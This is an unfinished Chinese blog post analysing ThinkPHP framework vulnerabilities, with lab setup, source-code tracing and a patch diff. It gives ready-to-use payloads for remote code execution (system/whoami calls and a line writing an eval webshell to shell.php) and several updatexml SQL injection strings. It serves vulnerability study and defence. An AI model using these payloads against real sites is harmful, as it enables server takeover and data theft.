---
layout: post
title:  "ThinkPHP漏洞分析与利用"
categories: 漏洞分析
tags: PHP代码审计 ThinkPHP
author: 0e0w
---

* content
{:toc}
这是一篇关于ThinkPHP漏洞分析的文章。由于作者能力有限，文中定会出现一些错误，请谅解。本文创建时间为2020年5月21日，最近一次更新时间为2021年5月21日。本文会不定期更新。鉴于凡世之忙碌，下一次更新也许是明天，也许是下辈子。本文未完成。待更新。

> 关于ThinkPHP是什么？更多详细内容见下面链接：
> [ThinkPHP官网](http://www.thinkphp.cn/)[ThinkPHP3.2.3完全开发手册](https://www.kancloud.cn/manual/thinkphp/1678)
> [ThinkPHP5.0完全开发手册](https://www.kancloud.cn/manual/thinkphp5/118003)
> [ThinkPHP5.1完全开发手册](https://www.kancloud.cn/manual/thinkphp5_1/353946)
> [ThinkPHP6.0完全开发手册](https://www.kancloud.cn/manual/thinkphp6_0/1037479)
> [看云PHP相关手册](https://www.kancloud.cn/search?q=ThinkPHP)
> 
> - ThinkPHP源码下载
> - 应用项目：https://github.com/top-think/think/releases
> - 核心框架：https://github.com/top-think/framework/releases

## 00-ThinkPHP基础
ThinkPHP是国内开发的优秀的PHP框架，存在大量基于其的CMS。
### 安装方式
**源码直接安装**

- ThinkPHP3和ThinkPHP5下载核心包之后，把解压后的目录拷贝到WEB服务器，访问public目录即可。
- ThinkPHP6必须使用Composer安装更新。PHP >= 7.1.0。
**composer安装**
> - curl -sS https://getcomposer.org/installer | php
> - mv composer.phar /usr/local/bin/composer
> - apt install apache2
> - apt install php
> - cd /var/www/html
> - composer create-project topthink/think tp5
>
**漏洞复现环境**
- https://github.com/vulhub/vulhub/tree/master/thinkphp
- docker pull medicean/vulapps:t_thinkphp_1
- docker run -d -p 88:80 medicean/vulapps:t_thinkphp_1
### 过滤器
在ThinkPHP有着很好的过滤器，基本上90%的情况是不存在XSS/CSRF等脚本漏洞的。
### 目录结构
ThinkPHP5.0目录结构
> ```
> project  应用部署目录
> ├─application           应用目录（可设置）
> │  ├─common             公共模块目录（可更改）
> │  ├─index              模块目录(可更改)
> │  │  ├─config.php      模块配置文件
> │  │  ├─common.php      模块函数文件
> │  │  ├─controller      控制器目录
> │  │  ├─model           模型目录
> │  │  ├─view            视图目录
> │  │  └─ ...            更多类库目录
> │  ├─command.php        命令行工具配置文件
> │  ├─common.php         应用公共（函数）文件
> │  ├─config.php         应用（公共）配置文件
> │  ├─database.php       数据库配置文件
> │  ├─tags.php           应用行为扩展定义文件
> │  └─route.php          路由配置文件
> ├─extend                扩展类库目录（可定义）
> ├─public                WEB 部署目录（对外访问目录）
> │  ├─static             静态资源存放目录(css,js,image)
> │  ├─index.php          应用入口文件
> │  ├─router.php         快速测试文件
> │  └─.htaccess          用于 apache 的重写
> ├─runtime               应用的运行时目录（可写，可设置）
> ├─vendor                第三方类库目录（Composer）
> ├─thinkphp              框架系统目录
> │  ├─lang               语言包目录
> │  ├─library            框架核心类库目录
> │  │  ├─think           Think 类库包目录
> │  │  └─traits          系统 Traits 目录
> │  ├─tpl                系统模板目录
> │  ├─.htaccess          用于 apache 的重写
> │  ├─.travis.yml        CI 定义文件
> │  ├─base.php           基础定义文件
> │  ├─composer.json      composer 定义文件
> │  ├─console.php        控制台入口文件
> │  ├─convention.php     惯例配置文件
> │  ├─helper.php         助手函数文件（可选）
> │  ├─LICENSE.txt        授权说明文件
> │  ├─phpunit.xml        单元测试配置文件
> │  ├─README.md          README 文件
> │  └─start.php          框架引导文件
> ├─build.php             自动生成定义文件（参考）
> ├─composer.json         composer 定义文件
> ├─LICENSE.txt           授权说明文件
> ├─README.md             README 文件
> ├─think                 命令行入口文件
> ```

ThinkPHP架构
- https://blog.csdn.net/qq_28137309/article/details/87352796
### MVC架构
MVC是一个设计模式，它强制性的使应用程序的输入、处理和输出分开。使用MVC应用程序被分成三个核心部件：模型（M）、视图（V）、控制器（C），它们各自处理自己的任务。
## 01-ThinkPHP与代码执行漏洞
### 5.0.0-5.0.12
**影响版本：**5.0.0-5.0.12
**payload：**

```
POST /5012/public/index.php
_method=__construct&method=*&filter[]=system&s=dir
```

**官方公告：**https://www.thinkphp.cn/topic/60992.html
**漏洞概述：**ThinkPHP5.0在核心代码中实现了表单请求类型伪装的功能，该功能利用$_POST['_method']变量来传递真实的请求方法，当攻击者设置$_POST['_method']=__construct时，Request类的method方法便会将该类的变量进行覆盖，攻击者利用该方式将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行执行任意命令。

**代码分析：**5.0.12

- _method=construct：在ThinkPHP中可以使用该变量进行请求类型的伪装。通过该请求可以隐藏真实请求信息，也可以整合现有应用系统。POST请求参数 “ _method=construct ”，将 construct 传给了var_method ，在Request类的method函数中执行后，实现了对Request类的 construct 构造函数的调用；并且将完整的POST参数传给了构造函数。

  ```php
  // 可以设置的请求类型：GET、POST、PUT和DELETE等一系列合法类型。
  <form method="post" action="">
      <input type="text" name="name" value="Hello">
      // 伪装请求类型为PUT
      <input type="hidden" name="_method" value="PUT" >
      <input type="submit" value="提交">
  </form>
  // 伪装请求变量的名字在应用配置文件设置，如下
  // 表单请求类型伪装变量(默认为_method)
  ```

  ```php
  'var_method'  => '_method', //application/config.php
  ```

- method=*&filter[]=system：跟踪Request.php模块中的 __construct函数。该函数中循环取出参数，如果是本类中存在的参数，就取用户传入的值为其赋值。 _method=construct 使得 method 函数调用了 construct 构造函数， 并且将完整的POST参数传递过去。实现了对本类中的 $method和$filter两个全局变量的覆盖。

  ```php
      protected function __construct($options = [])
      {
          foreach ($options as $name => $item) {
              if (property_exists($this, $name)) {
                  $this->$name = $item;
              }
          }
          if (is_null($this->filter)) {
              $this->filter = Config::get('default_filter');
          }
  
          // 保存 php://input
          $this->input = file_get_contents('php://input');
      }
  ```

- s=dir：application/config.php 中定义PATHINFO变量名为’ s ’。可用s传入需要执行的命令，如s=dir

  ```php
      // PATHINFO变量名 用于兼容模式
      'var_pathinfo'           => 's',
  ```

### 5.0.21-5.0.23

影响版本：5.0.21-5.0.23

漏洞概述：

payload：

> POST /public/index.php?s=captcha
>
> _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami

代码分析：

### 5.0.0-5.0.22、5.1-5.1.30

**影响版本：**5.0-5.0.22、5.1-5.1.30

**漏洞概述：**Thinkphp5.0和5.1中没有对路由中的控制器名进行严格过滤，当存在admin、index模块、没有开启强制路由的条件下（默认不开启），导致可以注入恶意代码利用反射类调用命名空间其他任意内置类，导致远程代码执行。

**官方公告：**https://blog.thinkphp.cn/869075

Payload：

> /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
>
> /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
>
> /?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
>
> ?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php @eval($_GET["code"])?^>>shell.php

invokefunction是什么？

**代码分析：**5.0.22

- Diff 5.0.22和5.0.23代码

  5.0.22#App.php:552

  ```php
  // 获取控制器名
  $controller = strip_tags($result[1] ?: $config['default_controller']);
  $controller = $convert ? strtolower($controller) : $controller;
  ```

  5.0.23#App.php:552-559

  ```php
  // 获取控制器名
  $controller = strip_tags($result[1] ?: $config['default_controller']);
  
  if (!preg_match('/^[A-Za-z](\w|\.)*$/', $controller)) {
  	throw new HttpException(404, 'controller not exists:' . $controller);
  }
  $controller = $convert ? strtolower($controller) : $controller;
  ```

  发现对$controller控制器名称进行了过滤。

- 从public/index.php跟踪代码

  ```php
  require __DIR__ . '/../thinkphp/start.php';
  ```

  ```php
  //thinkphp\start.php
  // ThinkPHP 引导文件
  // 1. 加载基础文件
  require __DIR__ . '/base.php';
  // 2. 执行应用
  App::run()->send();
  ```

  跟踪入口文件App::run()

  ```php
  //thinkphp/library/think/App.php:114行
  // 未设置调度信息则进行 URL 路由检测
  if (empty($dispatch)) {
  	$dispatch = self::routeCheck($request, $config);
  }
  ```

  跟踪app::routeCheck。通过request::path取参数。

  ```php
  //thinkphp\library\think\App.php:617
  public static function routeCheck($request, array $config)
  {
  	$path   = $request->path();
  	$depr   = $config['pathinfo_depr'];
  	$result = false;
  ```

  跟踪request::path。这里通过几种方式去解析路径，可以利用兼容模式传入s参数，去传递一个带反斜杠的路径(eg:\think\app)，如果使用phpinfo模式去传参，传入的反斜杠会被替换为'\'。

  ```php
      public function pathinfo()
      {
          if (is_null($this->pathinfo)) {
              if (isset($_GET[Config::get('var_pathinfo')])) {
                  // 判断URL里面是否有兼容模式参数
                  $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')];
                  unset($_GET[Config::get('var_pathinfo')]);
              } elseif (IS_CLI) {
                  // CLI模式下 index.php module/controller/action/params/...
                  $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : '';
              }
  
              // 分析PATHINFO信息
              if (!isset($_SERVER['PATH_INFO'])) {
                  foreach (Config::get('pathinfo_fetch') as $type) {
                      if (!empty($_SERVER[$type])) {
                          $_SERVER['PATH_INFO'] = (0 === strpos($_SERVER[$type], $_SERVER['SCRIPT_NAME'])) ?
                          substr($_SERVER[$type], strlen($_SERVER['SCRIPT_NAME'])) : $_SERVER[$type];
                          break;
                      }
                  }
              }
              $this->pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/');
          }
          return $this->pathinfo;
      }
  
      /**
       * 获取当前请求URL的pathinfo信息(不含URL后缀)
       * @access public
       * @return string
       */
      public function path()
      {
          if (is_null($this->path)) {
              $suffix   = Config::get('url_html_suffix');
              $pathinfo = $this->pathinfo();
              if (false === $suffix) {
                  // 禁止伪静态访问
                  $this->path = $pathinfo;
              } elseif ($suffix) {
                  // 去除正常的URL后缀
                  $this->path = preg_replace('/\.(' . ltrim($suffix, '.') . ')$/i', '', $pathinfo);
              } else {
                  // 允许任何后缀访问
                  $this->path = preg_replace('/\.' . $this->ext() . '$/i', '', $pathinfo);
              }
          }
          return $this->path;
      }
  ```

  继续分析app::routeCheck。路由检测时失败，如果开启了强制路由检查会抛出RouteNotFoundException,但默认这个强制路由是不开启的，也就是官方指的没有开启强制路由可能getshell。

  ```php
  // 路由检测（根据路由定义返回不同的URL调度）
  $result = Route::check($request, $path, $depr, $config['url_domain_deploy']);
  $must   = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must'];
  if ($must && false === $result) {
      // 路由无效
      throw new RouteNotFoundException();}
  
  // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索
  if (false === $result) {
      $result = Route::parseUrl($path, $depr, $config['controller_auto_search']);}
  ```

  跟踪：Route::parseUrl。这里拆分模块/控制器/操作，传入的url受用户控制，处理后分割成一个module数组返回。之后交给app::module处理：


- https://www.cnblogs.com/apossin/p/10111680.html
- https://www.secpulse.com/archives/93903.html
- https://xz.aliyun.com/t/3570
- https://www.jianshu.com/p/46ceb2c338bc

## 02-ThinkPHP与SQL注入漏洞

ThinkPHP在历史上爆发出很多的SQL注入漏洞，本部分将详细的对其进行具体分析。

### Builder类parseData方法

影响版本：5.0.13-5.0.15、5.1.0-5.1.5

payload：

> index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1

代码分析：5.0.15

https://www.jianshu.com/p/18d06277161e

参考 https://github.com/Mochazz/ThinkPHP-Vuln/

### Builder类parseOrder方法

影响版本：5.1.16-5.1.22

payload：

> ```
> index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1
> 代码分析：5.1.22
> ```

### Mysql类parseArrayData方法

影响版本：5.1.6-5.1.7

payload：

> /index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0

代码分析：5.1.7

[https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A52.md](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入2.md)

### Mysql类的parseWhereItem方法

影响版本：ThinkPHP5全版本

payload：

> /index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)#

代码分析：5.0.10

[https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53.md](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入3.md)

[https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54.md](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入4.md)

### Mysql类聚合函数相关方法

影响版本：5.0.0-5.0.21、5.1.3-5.1.25

payload：5.0.0-5.0.21 、5.1.3-5.1.10

> /index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23

payload：5.1.11-5.1.25

> /index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23

https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入6.md

https://github.com/Mochazz/ThinkPHP-Vuln

## 03-ThinkPHP与反序列化漏洞

https://github.com/Dido1960/thinkphp

https://github.com/Mochazz/ThinkPHP-Vuln

### 5.0反序列化

### 5.1反序列化

影响版本：5.1.37

### 5.2反序列化

### 6.0反序列化

## 04-ThinkPHP与文件包含漏洞

### 版本5.0.0<=5.0.18

## 05-基于ThinkPHP程序

- https://github.com/search?q=thinkphp+3.2.3&type=Repositories
- https://github.com/search?q=based+on+ThinkPHP&type=Repositories
- https://github.com/GreenCMS/GreenCMS

## 06-POC与EXP整理

## 07-参考链接

- https://xz.aliyun.com/t/3868
- https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection

  


